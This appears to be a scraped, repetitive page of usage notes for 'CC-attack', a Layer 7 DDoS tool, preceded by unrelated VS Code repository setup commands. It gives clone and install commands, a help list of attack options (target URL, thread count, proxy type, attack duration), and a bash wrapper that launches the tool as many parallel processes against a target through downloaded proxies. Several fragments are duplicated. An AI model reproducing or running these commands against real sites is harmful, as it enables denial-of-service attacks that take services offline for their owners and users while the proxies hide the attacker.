Save


sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc
echo -e "[code]\nname=Visual Studio Code\nbaseurl=https://packages.microsoft.com/yumrepos/vscode\nenabled=1\ngpgcheck=1\ngpgkey=https://packages.microsoft.com/keys/microsoft.asc" | sudo tee /etc/yum.repos.d/vscode.repo > /dev/null

This script is using for increasing the performance of cc.py.
Due to the suck performance of python since it has a GIL lock,
And I am lazy to make a multiprocess version.
There is a option for linux user to increase their performance of cc.py

This script basicly just run cc.py multiple times to make it "multi-processing"

First, put this script and cc.py in the same folder.

Then prepare the proxies list by yourself or just run "python3 cc.py -down -v 4" (-v socks version)

After that, change the number of process.

At last, change atk_cmd to your command and run the script by "bash multiproc.sh
atk_cmd="python3 cc.py -url http://target.com -v 4 -s 60"

#number of process that you want
process=10


pip3 install requests pysocks
git clone https://github.com/Leeon123/CC-attack.git
cd CC-attack



   <!-- /////    /////    ///////////// -->

  CCCCC/   CCCCC/   | CC-attack |/
 CC/      CC/       |-----------|/ 
 CC/      CC/       |  Layer 7  |/ 
 CC/////  CC/////   | ddos tool |/ 
  CCCCC/   CCCCC/   |___________|/
 pip3 install requests pysocks
git clone [def]
cd CC-attack
python3 cc.py <arguments>
===============  CC-attack help list  ===============
   -h/help   | showing this message
   -url      | set target url
   -m/mode   | set program mode
   -data     | set post data path (only works on post mode)
             | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default:5)
   -t        | set threads number (default:800)
   -f        | set proxies file (default:proxy.txt)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default:0)
   -s        | set attack time(default:60)
   -down     | download proxies
   -check    | check proxies
=====================================================
This script is using for increasing the performance of cc.py.
Due to the suck performance of python since it has a GIL lock,
And I am lazy to make a multiprocess version.
There is a option for linux user to increase their performance of cc.py

This script basicly just run cc.py multiple times to make it "multi-processing"

First, put this script and cc.py in the same folder.

Then prepare the proxies list by yourself or just run "python3 cc.py -down -v 4" (-v socks version)

After that, change the number of process.

At last, change atk_cmd to your command and run the script by "bash multiproc.sh"
atk_cmd="python3 cc.py -url http://target.com -v 4 -s 60"

#number of process that you want
process=10



[def]: https://github.com/Leeon123/CC-attack.git



pip3 install requests pysocks
git clone https://github.com/Leeon123/CC-attack.git
cd CC-attack
